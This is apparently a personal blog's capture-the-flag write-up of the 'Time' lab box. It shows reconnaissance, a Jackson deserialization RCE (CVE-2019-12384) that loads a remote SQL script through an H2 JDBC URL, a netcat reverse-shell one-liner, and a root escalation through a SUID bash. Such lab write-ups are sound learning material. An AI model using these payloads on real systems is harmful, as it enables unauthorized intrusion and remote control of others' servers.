@@ -1,0 +1,74 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Time - My Cyberjourney</title>
+        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="Time.css" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Alumni+Sans+Pinstripe:ital@0;1&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Roboto+Serif:ital,opsz,wght@0,8..144,100..900;1,8..144,100..900&display=swap" rel="stylesheet">
+    </head>
+    <body>
+        <!-- Menú -->
+        <nav class="w3-bar">
+            <div class="logo">
+                <p>My Cyberjourney</p>
+            </div>
+            <div class="w3-bar-item w3-right w3-hide-large w3-hover-opacity" onclick="w3_open()">
+                <i class="fa fa-bars w3-xlarge"></i>
+            </div>
+            <div class="w3-hide-small">
+                <ul class="elementos-menu">
+                    <li class="w3-bar-item"><a href="../../index.html">Home</a></li>
+                    <li class="w3-bar-item"><a href="../../writeups.html">Writeups</a></li>
+                    <li class="w3-bar-item"><a href="../../learning.html">Learning Journey</a></li>
+                </ul>
+            </div>
+        </nav> 
+        <div class="content">
+            <h1 class="title">MEDIUM - TIME</h1>
+<h1><strong>1. Recon</strong></h1>
+<h2>Nmap</h2>
+<p><code>nmap</code> finds two open ports: SSH (22) and  HTTP (80)</p>
+<p><img alt="imagen.png" src="imagen.png" /></p>
+<p>The NSE (Nmap Scripting Engine) finds the following information:</p>
+<ul>
+<li>The box is using Ubuntu.</li>
+<li>The version of the SSH service is OpenSSH 8.2p1</li>
+<li>The HTTP server is using Apache httpd 2.4.41</li>
+<li>The title of the website suggests it is an Online JSON parser</li>
+</ul>
+<p><img alt="imagen.png" src="imagen%201.png" /></p>
+<hr />
+<h2>Website - TCP 80</h2>
+<p>Before connecting to the page, I have run <code>gobuster</code> to find hidden directories and files within the server, but the results aren’t interesting at all. Visiting the website I see a ‘Online JSON beautifier &amp; validator’ software. After testing it a little bit I can see that the ‘Beautify’ option works properly, but the ‘Validate’ options shows an error when the input is anything else than ‘true’, ‘false’ or ‘null’. That error is the following: <code>Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'a': was expecting ('true', 'false' or 'null')</code>. After looking it up and reading a couple forums I see that <a href="https://github.com/FasterXML/jackson"><code>Jackson</code></a> is a <code>JSON parser for Java</code>.</p>
+<p><img alt="imagen.png" src="imagen%202.png" /></p>
+<p><img alt="imagen.png" src="imagen%203.png" /></p>
+<hr />
+<h1><strong>2. Gaining Access</strong></h1>
+<p>Searching ‘Java Jackson RCE’ I see there are a couple existing CVE’s for <code>Jackson</code> (CVE-2020-9547 and CVE-2019-12384) which lead to Remote Code Execution, but it seems they do not work. After reading a couple articles about <a href="https://swapneildash.medium.com/understanding-java-de-serialization-ee96054da15d">Java deserialization</a> and <a href="https://swapneildash.medium.com/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038">Jackson deserialization</a>, I have come across with <a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">another article</a> which explains CVE-2019-12384. Following the steps of the latter article I create a <code>inject.sql</code> file, start a <code>http</code> server with <code>python</code> in port 8000, and run its content sending <code>["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http:\/\/10.10.14.19:8000\/inject.sql'"}]</code> through the JSON validator. After a few seconds, my <code>netcat</code> listener receives the <code>id</code> command executed in the target system.</p>
+<p><img alt="imagen.png" src="imagen%204.png" /></p>
+<p><img alt="imagen.png" src="imagen%205.png" /></p>
+<p>The reason why this works is because Jackson’s default typing is enabled. This allows JSON to specify which Java class should be instantiated during deserialization, enabling not only the deserialization of known classes but also the loading and instantiation of new classes. Using <code>["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:"}]</code>, the class <code>DriverManagerConnectionSource</code> is loaded and the setter method <code>setUrl(String url)</code> is called with the provided url (<code>{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http:\/\/10.10.14.19:8000\/inject.sql'"}</code>). When that JDBC (Java Database Connectivity) URL is called, an in-memory H2 database is instantiated, allowing the execution of SQL scripts from a remote URL via the <code>INIT=RUNSCRIPT FROM</code> query. However, H2 doesn’t allow the direct execution of system commands through SQL queries. This limitation can be bypassed by creating Java aliases, which invoke Java methods directly from SQL. This lets the attackers execute their own scripts by setting a remote HTTP server and loading their own scripts from there.</p>
+<p>Now that everything is explained, I will try getting a reverse shell modifying the <code>inject.sql</code> script to execute <code>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.19 4444 &gt;/tmp/f</code>. It works and I get command execution in the system as the user <code>pericles</code>.</p>
+<p><img alt="imagen.png" src="imagen%206.png" /></p>
+<p><img alt="imagen.png" src="imagen%207.png" /></p>
+<hr />
+<h1>3. Privilege Escalation</h1>
+<h2>Root</h2>
+<p>Running <code>pspy</code> in the target system, I discover a process with UID=0 (running as <code>root</code>) which is executing periodically the file <code>/usr/bin/timer_backup.sh</code>. Checking the permissions of that script, I find that it belongs to <code>pericles</code>, so I can modify it and it will be executed as <code>root</code>. </p>
+<p><img alt="imagen.png" src="imagen%208.png" /></p>
+<p><img alt="imagen.png" src="imagen%209.png" /></p>
+<p><img alt="imagen.png" src="imagen%2010.png" /></p>
+<p>I add a command to activate the SUID bit of <code>bash</code> and once the script is executed, I can run <code>bash -p</code> to get a shell with <code>root</code> permissions. Now I can read <code>/root/root.txt</code> and submit the flag. </p>
+<p><img alt="imagen.png" src="imagen%2011.png" /></p>
+<p><img alt="imagen.png" src="imagen%2012.png" /></p>
+<p><img alt="imagen.png" src="imagen%2013.png" /></p>
+<hr />
+        </div>
+    </body>
+</html>
